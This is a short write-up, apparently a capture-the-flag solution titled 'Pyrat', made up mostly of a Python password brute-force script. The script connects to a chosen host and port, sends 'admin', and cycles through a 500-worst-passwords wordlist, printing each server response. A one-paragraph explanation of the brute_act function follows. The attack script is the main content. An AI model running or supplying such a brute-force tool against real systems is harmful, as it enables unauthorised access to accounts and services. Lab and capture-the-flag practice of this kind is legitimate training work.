# Pyrat

```python
# Importing area
import subprocess
import sys
import time
import socket

# Code start
pass_file = "/home/user/Documents/wordlists/passwords/500-worst-passwords.txt"

host = input("enter the hostname: ")
port = int(input("enter the port: ")) 

def read_file(file):
    try:
        with open(file) as f:
            return f.readlines()

    except Exception:
        print(f"The problem is: {Exception}")
        sys.exit


def brute_act(file, host, port):
    pass_list = read_file(file)
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        print(f"connecting to {host}:{port}.....")
        s.connect((host, port))

        # send the admin word
        s.sendall("admin".encode('utf-8'))
        print("admin sent")

        response = s.recv(1024)
        print(response.decode("utf-8"))
        time.sleep(2)

        for i in pass_list:
            s.sendall(f"{i}".encode("utf-8"))
            print(f"Tried: {i}")
            time.sleep(1.5)
            response = s.recv(1024)
            print(response)
            time.sleep(1.5)
            s.sendall("admin".encode('utf-8'))


if __name__ == "__main__":
    print("-----------------------Brute Payload-------------------------")
    brute_act(pass_file,host,port)
```

The core of the code is in the `brute_act` function where it opens a connection and sends the word admin to the remote desktop then wait for receiving a response from the server if the response, in the responses woll appear if the password is right or wrong. 
